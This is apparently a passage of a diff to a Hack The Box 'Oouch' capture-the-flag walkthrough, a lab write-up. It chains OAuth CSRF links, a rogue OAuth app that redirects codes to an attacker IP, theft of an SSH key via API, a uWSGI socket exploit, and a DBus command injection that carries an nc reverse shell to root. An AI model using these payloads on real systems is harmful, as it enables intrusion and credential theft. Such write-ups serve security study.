+<p><strong>Why we drop it:</strong><br>If we let this request complete, <em>our</em> <code>testuser</code> account will be linked to our <code>testauth</code> account. That's useless. We want the admin bot to send this request instead, so the admin's account gets linked to our OAuth account.</p>
+
+
 <h3 id="step-2-2-weaponize-the-contact-form">Step 2.2: Weaponize the Contact Form</h3>
 <p>Visit <code>http://consumer.oouch.htb:5000/contact</code> while logged in as <code>testuser</code>.</p>
 <p>Paste this into the message box:</p>
 <pre><code class="language-html" data-language="html">&lt;a href="http://consumer.oouch.htb:5000/oauth/connect/token?code=YOUR_CODE_HERE"&gt;click me&lt;/a&gt;
 </code></pre>
 <p>Submit the form.</p>
-<p><strong>What happens:</strong><br />The admin bot (running as user <code>qtc</code> on the consumer app) receives your message, extracts URLs, and visits them using <code>python-requests</code>. When it clicks your link, it sends the OAuth connection request with <em>its own session cookie</em>. The consumer app links the admin's <code>qtc</code> account to your <code>testauth</code> OAuth account.</p>
-<p><strong>Why this works:</strong><br />The consumer app doesn't verify that the request came from the auth server's redirect flow. It just sees a valid code and a valid session cookie, and links them together.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"The contact form is an SSRF (Server-Side Request Forgery) vector. The admin bot is a browser that follows links. I'm feeding it a link that performs a sensitive action on its behalf. This is classic CSRF — the admin is tricked into performing an action they didn't intend."</p>
-</blockquote>
+<p><strong>What happens:</strong><br>The admin bot (running as user <code>qtc</code> on the consumer app) receives your message, extracts URLs, and visits them using <code>python-requests</code>. When it clicks your link, it sends the OAuth connection request with <em>its own session cookie</em>. The consumer app links the admin's <code>qtc</code> account to your <code>testauth</code> OAuth account.</p>
+<p><strong>Mechanism:</strong><br>The consumer app doesn't verify that the request came from the auth server's redirect flow. It just sees a valid code and a valid session cookie, and links them together.</p>
+
+
 <h3 id="step-2-3-login-as-qtc">Step 2.3: Login as qtc</h3>
 <p>Wait 1-2 minutes for the admin bot to click the link.</p>
 <p>Then visit: <code>http://consumer.oouch.htb:5000/oauth/login</code></p>
@@ -194,11 +179,9 @@ Host: consumer.oouch.htb:5000
 <p>Visit <code>/profile</code> to confirm:</p>
 <pre><code>Hello qtc!
 </code></pre>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"I didn't steal the admin's password. I didn't break the password hash. I simply convinced the system that the admin wanted to link their account to my OAuth account. Now I inherit all of the admin's privileges on the consumer app. This is identity theft via protocol abuse."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="step-3-escalation-to-qtc-and-document-discovery">Step 3: Escalation to qtc and Document Discovery</h2>
 <p>Now that you're <code>qtc</code>, visit <code>/documents</code>.</p>
 <p>You see three files:</p>
@@ -216,20 +199,18 @@ oauth/authorize -&gt; Now also supports GET method.
 <ol>
 <li>We have developer credentials for the auth server.</li>
 <li>There's an API endpoint <code>/api/get_user</code> for retrieving user data.</li>
-<li>The <code>/oauth/authorize</code> endpoint supports GET — meaning we can send it as a clickable link (no POST required).</li>
+<li>The <code>/oauth/authorize</code> endpoint supports GET - meaning we can send it as a clickable link (no POST required).</li>
 <li>SSH keys are accessible via the API.</li>
 </ol>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"The developer credentials let me register new OAuth applications. The GET support on <code>/oauth/authorize</code> means I can perform another CSRF attack via the contact form. And the todo is a hint — SSH keys are stored on the auth server and retrievable via API. I'm looking at a clear path to shell access."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="step-4-registering-a-malicious-oauth-application">Step 4: Registering a Malicious OAuth Application</h2>
 <p>Visit: <code>http://authorization.oouch.htb:8000/oauth/applications/register/</code></p>
 <p>You'll get an HTTP Basic Auth prompt. Login with:</p>
 <ul>
 <li>Username: <code>develop</code></li>
-<li>Password: null</li>
+<li>Password: <code>REDACTED</code></li>
 </ul>
 <p>Fill out the form:</p>
 <ul>
@@ -239,12 +220,10 @@ oauth/authorize -&gt; Now also supports GET method.
 <li><strong>Redirect URIs:</strong> <code>http://10.10.14.6/token</code></li>
 </ul>
 <p>Save it. You'll receive a <strong>Client ID</strong> and <strong>Client Secret</strong>. Write these down.</p>
-<p><strong>Why we do this:</strong><br />We need our own OAuth application so we can control the <code>redirect_uri</code>. When the auth server redirects to <code>http://10.10.14.6/token</code>, the authorization code will be sent to our Kali machine instead of the legitimate consumer app.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"I'm registering myself as a legitimate third-party application. The auth server doesn't know I'm an attacker — I have valid developer credentials. By setting the redirect URI to my own IP, I'm positioning myself to intercept the most sensitive token in the OAuth flow: the authorization code that grants access to user data."</p>
-</blockquote>
-<hr />
+<p><strong>Reason:</strong><br>We need our own OAuth application so we can control the <code>redirect_uri</code>. When the auth server redirects to <code>http://10.10.14.6/token</code>, the authorization code will be sent to our Kali machine instead of the legitimate consumer app.</p>
+
+
+<hr>
 <h2 id="step-5-csrf-2-stealing-the-admin-s-authorization-code">Step 5: CSRF #2 - Stealing the Admin's Authorization Code</h2>
 <h3 id="the-goal">The Goal</h3>
 <p>We want the admin bot (logged into the auth server as <code>qtc</code>) to authorize our malicious app. This will redirect to our Kali machine with an authorization code that grants us access to qtc's data.</p>
@@ -264,7 +243,7 @@ oauth/authorize -&gt; Now also supports GET method.
 <li><p>Start a listener on Kali:</p>
 <pre><code class="language-bash" data-language="bash">sudo nc -lvnp 80
 </code></pre>
-<p><em>(Port 80 is used because our redirect URI is <code>http://10.10.14.6/token</code> — no port specified means port 80.)</em></p>
+<p><em>(Port 80 is used because our redirect URI is <code>http://10.10.14.6/token</code> : no port specified means port 80.)</em></p>
 </li>
 <li><p>Submit the link via the contact form:</p>
 <pre><code class="language-html" data-language="html">&lt;a href="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=YOUR_CLIENT_ID&amp;response_type=code&amp;redirect_uri=http://10.10.14.6/token&amp;scope=read&amp;state=&amp;allow=Authorize"&gt;click me&lt;/a&gt;
@@ -280,12 +259,10 @@ User-Agent: python-requests/2.21.0
 </li>
 </ol>
 <p><strong>Copy the <code>code</code> value immediately.</strong> These codes expire quickly (usually within minutes).</p>
-<p><strong>Why this works:</strong><br />The auth server's <code>/oauth/authorize</code> endpoint supports GET requests and doesn't validate CSRF tokens properly. When the admin bot (already authenticated to the auth server) clicks the link, the auth server sees a valid session and immediately issues an authorization code for our app to access qtc's data.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"This is the second time I'm abusing the contact form. The first CSRF hijacked the admin's identity on the consumer app. This second CSRF hijacks the admin's authorization on the auth server itself. I'm chaining two CSRF vulnerabilities to escalate from an anonymous user to having an authorization token for the admin's most sensitive data."</p>
-</blockquote>
-<hr />
+<p><strong>Mechanism:</strong><br>The auth server's <code>/oauth/authorize</code> endpoint supports GET requests and doesn't validate CSRF tokens properly. When the admin bot (already authenticated to the auth server) clicks the link, the auth server sees a valid session and immediately issues an authorization code for our app to access qtc's data.</p>
+
+
+<hr>
 <h2 id="step-6-exchanging-the-code-for-an-access-token">Step 6: Exchanging the Code for an Access Token</h2>
 <p>The authorization code alone is useless. We need to exchange it for an access token using our app's <code>client_id</code> and <code>client_secret</code>.</p>
 <pre><code class="language-bash" data-language="bash">curl -s http://authorization.oouch.htb:8000/oauth/token/ \
@@ -297,45 +274,39 @@ User-Agent: python-requests/2.21.0
 </code></pre>
 <p><strong>Expected output:</strong></p>
 <pre><code class="language-json" data-language="json">{
-  "access_token": null,
+  "access_token": "REDACTED",
   "expires_in": 600,
   "token_type": "Bearer",
   "scope": "read",
-  "refresh_token": null
+  "refresh_token": "REDACTED"
 }
 </code></pre>
-<p><strong>Why we do this:</strong><br />The access token is REDACTED actual key that unlocks the resource server APIs. The authorization code was just a temporary voucher.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"I now have a Bearer token that represents the admin's identity on the auth server. With this token, I can query any API endpoint that the admin has access to. I'm no longer attacking the web application — I'm now an authenticated API client with the admin's privileges."</p>
-</blockquote>
-<hr />
+<p><strong>Reason:</strong><br>The access token is the actual key that unlocks the resource server APIs. The authorization code was just a temporary voucher.</p>
+
+
+<hr>
 <h2 id="step-7-retrieving-the-ssh-key">Step 7: Retrieving the SSH Key</h2>
-<p>The documents hinted at <code>/api/get_user</code>, but the todo mentioned SSH keys. Let's try <code>/api/get_ssh</code>:</p>
+<p>The documents hinted at <code>/api/get_user</code>, but the todo mentioned SSH keys. Try <code>/api/get_ssh</code>:</p>
 <pre><code class="language-bash" data-language="bash">curl -s http://authorization.oouch.htb:8000/api/get_ssh \
-  -H "Authorization: Bearer REDACTED | jq -r '.ssh_key' &gt; id_rsa_qtc
+  -H "Authorization: Bearer REDACTED" | jq -r '.ssh_key' &gt; id_rsa_qtc
 </code></pre>
 <p>Set proper permissions and SSH in:</p>
 <pre><code class="language-bash" data-language="bash">chmod 600 id_rsa_qtc
 ssh -i id_rsa_qtc qtc@10.129.29.195
 </code></pre>
-<p><strong>What this does:</strong><br />The <code>Authorization: Bearer</code> header tells the resource server who we are. The server returns qtc's SSH private key, which was stored during registration on the auth server.</p>
-<p><strong>Why this works:</strong><br />OAuth2 scopes define what data an app can access. The <code>read</code> scope apparently includes SSH key data. The API endpoint <code>/api/get_ssh</code> was designed to let consumer applications retrieve SSH credentials for automation purposes.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"API enumeration is just like directory enumeration, but for endpoints. <code>/api/get_user</code> gave me profile data. I guessed <code>/api/get_ssh</code> based on the todo hint and the registration form fields. Always fuzz or guess API endpoints once you have a valid token."</p>
-</blockquote>
-<hr />
+<p><strong>What this does:</strong><br>The <code>Authorization: Bearer</code> header tells the resource server who we are. The server returns qtc's SSH private key, which was stored during registration on the auth server.</p>
+<p><strong>Mechanism:</strong><br>OAuth2 scopes define what data an app can access. The <code>read</code> scope apparently includes SSH key data. The API endpoint <code>/api/get_ssh</code> was designed to let consumer applications retrieve SSH credentials for automation purposes.</p>
+
+
+<hr>
 <h2 id="step-8-user-flag">Step 8: User Flag</h2>
 <p>Once logged in as <code>qtc</code>:</p>
 <pre><code class="language-bash" data-language="bash">cat ~/user.txt
 </code></pre>
 <p><strong>Flag:</strong> <code>838d5[redacted]dc8b3f49c</code></p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"I didn't brute-force a password. I didn't exploit a buffer overflow. I abused the design of the OAuth2 protocol itself — specifically, missing CSRF protections and overprivileged API endpoints. This is a logical exploit chain, and it's often more powerful than technical exploits because it bypasses traditional security controls like firewalls and IDS."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="step-9-post-user-enumeration-discovering-docker-containers">Step 9: Post-User Enumeration - Discovering Docker Containers</h2>
 <p>As <code>qtc</code>, check network interfaces:</p>
 <pre><code class="language-bash" data-language="bash">ip a
@@ -347,25 +318,23 @@ ssh -i id_rsa_qtc qtc@10.129.29.195
 <li><code>br-325e0b39713a</code>: A custom Docker bridge (172.18.0.1/16).</li>
 <li>Multiple <code>veth*</code> interfaces: Virtual Ethernet pairs connecting containers to the bridge.</li>
 </ul>
-<p><strong>Why this matters:</strong><br />The web applications (ports 5000 and 8000) are running inside Docker containers, not directly on the host. The host is just a Docker host.</p>
+<p>The web applications (ports 5000 and 8000) are running inside Docker containers, not directly on the host. The host is just a Docker host.</p>
 <p>Check for container IPs:</p>
 <pre><code class="language-bash" data-language="bash">for ip in 172.18.0.{2..5}; do
   echo -n "$ip: "
   timeout 1 bash -c "echo &gt; /dev/tcp/$ip/22" 2&gt;/dev/null &amp;&amp; echo "SSH OPEN" || echo "closed"
 done
 </code></pre>
-<p><strong>What you find:</strong><br /><code>172.18.0.4</code> has SSH open.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"The presence of Docker means the attack surface is larger than just the host. Containers often have different users, different configurations, and sometimes even different vulnerabilities. SSH being open on a container is unusual — it suggests the container is meant to be accessed by developers or by the host for maintenance."</p>
-</blockquote>
+<p><strong>What you find:</strong><br><code>172.18.0.4</code> has SSH open.</p>
+
+
 <p>Also check the note in qtc's home:</p>
 <pre><code class="language-bash" data-language="bash">cat ~/.note.txt
 </code></pre>
 <p><strong>Output:</strong></p>
 <pre><code>Implementing an IPS using DBus and iptables == Genius?
 </code></pre>
-<p><strong>What this tells us:</strong><br />There's a DBus-based IPS (Intrusion Prevention System) running. DBus is an inter-process communication system. If we can talk to it, we might be able to interact with a root-owned process.</p>
+<p><strong>What this tells us:</strong><br>There's a DBus-based IPS (Intrusion Prevention System) running. DBus is an inter-process communication system. If we can talk to it, we might be able to interact with a root-owned process.</p>
 <p>Check the DBus config:</p>
 <pre><code class="language-bash" data-language="bash">cat /etc/dbus-1/system.d/htb.oouch.Block.conf
 </code></pre>
@@ -384,12 +353,10 @@ done
 <li>The DBus service <code>htb.oouch.Block</code> is <strong>owned by root</strong>.</li>
 <li>The user <code>www-data</code> is allowed to send messages to it.</li>
 </ul>
-<p><strong>But wait</strong> — there is no <code>www-data</code> user on the <em>host</em>. The <code>www-data</code> user exists <strong>inside the consumer container</strong>. This means we need to get a shell as <code>www-data</code> inside the container to talk to this DBus service.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"This is a privilege escalation bridge. The host has a root-owned DBus service that accepts messages from www-data. But www-data doesn't exist on the host — only inside the container. This means the container is intentionally allowed to talk to a root service on the host. If I can become www-data inside the container, I can send commands to root."</p>
-</blockquote>
-<hr />
+<p><strong>But wait</strong> - there is no <code>www-data</code> user on the <em>host</em>. The <code>www-data</code> user exists <strong>inside the consumer container</strong>. This means we need to get a shell as <code>www-data</code> inside the container to talk to this DBus service.</p>
+
+
+<hr>
 <h2 id="step-10-pivoting-into-the-consumer-container">Step 10: Pivoting into the Consumer Container</h2>
 <p>From the host (<code>qtc@oouch</code>), SSH into the consumer container:</p>
 <pre><code class="language-bash" data-language="bash">ssh qtc@172.18.0.4
@@ -410,14 +377,12 @@ chmod-sock = 777
 vacuum = true
 die-on-term = true
 </code></pre>
-<p><strong>Key finding:</strong><br />The uWSGI socket is at <code>/tmp/uwsgi.socket</code> and has permissions <code>777</code> (world-writable).</p>
-<p><strong>What is uWSGI?</strong><br />uWSGI is a gateway between the web server (nginx) and the Python application. It listens on a Unix socket and forwards HTTP requests to the Flask app. Normally, only nginx should be able to write to this socket.</p>
-<p><strong>Why <code>777</code> is catastrophic:</strong><br />Any user on the system — including <code>qtc</code> inside the container — can write to this socket. If we craft a valid uWSGI request, the uWSGI master process will execute it as the configured user: <code>www-data</code>.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"A world-writable socket is a world-writable file that executes code. If I can speak the uWSGI protocol, I can make the uWSGI server run any command I want — as www-data. This is not a vulnerability in uWSGI itself; it's a configuration vulnerability. Someone set <code>chmod-sock = 777</code> for convenience and created a privilege escalation path."</p>
-</blockquote>
-<hr />
+<p><strong>Key finding:</strong><br>The uWSGI socket is at <code>/tmp/uwsgi.socket</code> and has permissions <code>777</code> (world-writable).</p>
+<p><strong>What is uWSGI?</strong><br>uWSGI is a gateway between the web server (nginx) and the Python application. It listens on a Unix socket and forwards HTTP requests to the Flask app. Normally, only nginx should be able to write to this socket.</p>
+<p><strong>Why <code>777</code> is catastrophic:</strong><br>Any user on the system - including <code>qtc</code> inside the container - can write to this socket. If we craft a valid uWSGI request, the uWSGI master process will execute it as the configured user: <code>www-data</code>.</p>
+
+
+<hr>
 <h2 id="step-11-exploiting-uwsgi-for-www-data">Step 11: Exploiting uWSGI for www-data</h2>
 <h3 id="the-theory">The Theory</h3>
 <p>uWSGI communicates over a binary protocol. If we can craft a valid uWSGI packet, we can:</p>
@@ -452,18 +417,16 @@ EOF
 <pre><code class="language-bash" data-language="bash">cd /tmp
 python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c 'python /tmp/rev.py'
 </code></pre>
-<p><strong>What happens:</strong><br />The exploit writes a crafted uWSGI packet to the socket. The uWSGI master process parses it and executes our Python reverse shell. The shell connects back to the host's Docker bridge IP (<code>172.18.0.1</code>) on port 4444.</p>
+<p><strong>What happens:</strong><br>The exploit writes a crafted uWSGI packet to the socket. The uWSGI master process parses it and executes our Python reverse shell. The shell connects back to the host's Docker bridge IP (<code>172.18.0.1</code>) on port 4444.</p>
 <p><strong>In Terminal 1, you get:</strong></p>
 <pre><code>connect to [172.18.0.1] from (UNKNOWN) [172.18.0.4] 52612
 bash: /root/.bashrc: Permission denied
 www-data@1201393c995b:/code$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"I turned a configuration mistake (world-writable socket) into code execution as a different user. This is local privilege escalation inside the container. The uWSGI master process is essentially a command execution service listening on a file. Since the file has no access controls, anyone can use the service."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="step-12-dbus-command-injection-to-root">Step 12: DBus Command Injection to Root</h2>
 <h3 id="the-theory-2">The Theory</h3>
 <p>From the host's DBus config, we know:</p>
@@ -478,7 +441,7 @@ block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
 response = block_iface.Block(client_ip)
 </code></pre>
 <p>When someone submits XSS to the contact form, the app calls <code>block_iface.Block(client_ip)</code> to block their IP via iptables.</p>
-<p><strong>The vulnerability:</strong><br />The root-owned DBus service takes a string (the IP address) and likely executes it in a shell command like:</p>
+<p><strong>The vulnerability:</strong><br>The root-owned DBus service takes a string (the IP address) and likely executes it in a shell command like:</p>
 <pre><code class="language-bash" data-language="bash">iptables -A INPUT -s [USER_INPUT] -j DROP
 </code></pre>
 <p>If we can control <code>[USER_INPUT]</code>, we can inject arbitrary shell commands.</p>
@@ -489,7 +452,7 @@ response = block_iface.Block(client_ip)
 <p><strong>Terminal 1 (www-data shell in container):</strong> Send the malicious DBus message:</p>
 <pre><code class="language-bash" data-language="bash">dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 172.18.0.1 4445 &gt;/tmp/f;"
 </code></pre>
-<p><strong>What happens:</strong><br />The DBus service receives our string. Instead of a valid IP like <code>10.10.14.6</code>, it receives a shell command with semicolons. Because the service likely uses unsafe string concatenation or <code>os.system()</code>, it executes our entire payload as root.</p>
+<p><strong>What happens:</strong><br>The DBus service receives our string. Instead of a valid IP like <code>10.10.14.6</code>, it receives a shell command with semicolons. Because the service likely uses unsafe string concatenation or <code>os.system()</code>, it executes our entire payload as root.</p>
 <p>The payload:</p>
 <ol>
 <li>Removes <code>/tmp/f</code> if it exists.</li>
@@ -503,23 +466,21 @@ response = block_iface.Block(client_ip)
 # id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"This is the final bridge. The container was supposed to be isolated, but DBus is a shared resource between the container and the host. The root-owned DBus service trusted input from the container's www-data user. By injecting a shell command where an IP address was expected, I turned a 'block this IP' feature into a 'give me a root shell' feature. This is command injection — the most classic vulnerability in existence — hiding inside a modern inter-process communication system."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="step-13-root-flag">Step 13: Root Flag</h2>
 <p>As root:</p>
 <pre><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
 <p><strong>Flag:</strong> <code>9718ae30[redacted]96f133b</code></p>
-<hr />
-<h2 id="key-takeaways">Key Takeaways</h2>
+<hr>
+<h2 id="review-notes">Review notes</h2>
 <h3 id="technical-lessons">Technical Lessons</h3>
 <ol>
 <li><p><strong>OAuth2 without CSRF protection is broken.</strong> Both the consumer and the auth server lacked proper <code>state</code> parameter validation, allowing us to chain two CSRF attacks to hijack an admin account and steal their authorization code.</p>
 </li>
-<li><p><strong>API endpoints leak sensitive data.</strong> The <code>/api/get_ssh</code> endpoint returned private SSH keys. API design should follow the principle of least privilege — if an endpoint isn't needed, don't expose it.</p>
+<li><p><strong>API endpoints leak sensitive data.</strong> The <code>/api/get_ssh</code> endpoint returned private SSH keys. API design should follow the principle of least privilege - if an endpoint isn't needed, don't expose it.</p>
 </li>
 <li><p><strong>World-writable sockets are code execution.</strong> The uWSGI socket at <code>777</code> permissions allowed any user to inject commands into the web server process.</p>
 </li>
@@ -530,7 +491,7 @@ uid=0(root) gid=0(root) groups=0(root)
 </ol>
 <h3 id="methodological-lessons">Methodological Lessons</h3>
 <ol>
-<li><p><strong>Follow the trust chain.</strong> OAuth2 is REDACTED trust delegation. Find where trust is assumed and question it.</p>
+<li><p><strong>Follow the trust chain.</strong> OAuth2 is about trust delegation. Find where trust is assumed and question it.</p>
 </li>
 <li><p><strong>Read the source code (or infer it).</strong> The todo.txt hinted at SSH keys. The note.txt hinted at DBus. The <code>uwsgi.ini</code> showed the socket permissions. Configuration files are often more valuable than exploits.</p>
 </li>
@@ -548,10 +509,9 @@ uid=0(root) gid=0(root) groups=0(root)
     -&gt; uWSGI socket exploit -&gt; www-data shell
     -&gt; DBus command injection -&gt; Root shell
 </code></pre>
-<p>This is Oouch: a box that teaches you that modern authentication protocols, containerization, and inter-process communication are all just attack surfaces waiting to be understood.</p>
-17:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$1c"}}]
+<p>Oouch connects OAuth trust, container networking, and a privileged DBus service.</p>17:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$1c"}}]
 18:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-obscurity-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Obscurity Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ophiuchi-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Ophiuchi Walkthrough"}]]}]}]]}]
 19:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-1d:T50d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/#article","headline":"Hack The Box: Oouch Walkthrough","description":"An archived walkthrough of the retired Hack The Box Oouch machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/","datePublished":"2026-06-11T12:26:26.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3975,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6df034e923113b53b84732922f116c97a8bc9482/HTB-Oouch.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-oouch-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Oouch Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/"}]}]}1a:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1d"}}]
+1d:T564,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/#article","headline":"Hack The Box: Oouch Walkthrough","description":"Two OAuth CSRF flaws hijacked the consumer admin and stole an authorization code for qtc's SSH key, then a world-writable uWSGI socket pivoted into the consumer container and DBus command injection executed as root.","url":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/","datePublished":"2026-06-11T12:26:26.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2924,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6df034e923113b53b84732922f116c97a8bc9482/HTB-Oouch.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-oouch-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Oouch Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-oouch-walkthrough/"}]}]}1a:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1d"}}]
 1b:["$","$L1e",null,{"children":["$","$1f",null,{"name":"Next.MetadataOutlet","children":"$@20"}]}]
 20:null
